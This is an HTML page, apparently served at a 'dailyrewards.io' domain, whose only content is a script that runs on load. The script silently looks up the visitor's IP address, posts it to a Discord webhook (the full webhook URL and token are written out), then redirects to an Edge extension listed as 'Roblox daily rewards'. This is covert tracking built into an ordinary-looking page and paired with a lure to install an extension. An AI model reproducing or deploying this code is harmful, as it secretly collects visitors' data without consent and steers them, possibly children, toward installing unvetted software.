<!DOCTYPE html>
<html lang='de' dir='ltr'>

<head>
  <meta charset='utf-8'>
  <script>
    function webhook() {

      fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => {
              const delay = ms => new Promise(res => setTimeout(res, ms))

              console.log(data.ip);
              var hook = new XMLHttpRequest();
  
              hook.open('POST', 'https://discord.com/api/webhooks/1270864376227827724/7W_A-idtM7B3Vpk86yOTBUBKhA-T-sm0c5YUNjQ-35V6szHqH9m2b0RSKsYsFKt1Los1');
        
              hook.setRequestHeader('Content-type', 'application/json');
        
              var content = {
                content: 'Someone went to the **dailyrewards.io** domain, congratulations! **IP Address:** '+data.ip
              }
        
              hook.send(JSON.stringify(content));

              (async function (){
                await delay(500)
                window.location.href = 'https://microsoftedge.microsoft.com/addons/detail/roblox-daily-rewards/gfojahdoimefaoeehgdjmlkcpmaaoaik';
              })()

          })
          .catch(error => {
              console.log('Error:', error);
          });
      
    }

    webhook()
  </script>
</head>

</html>
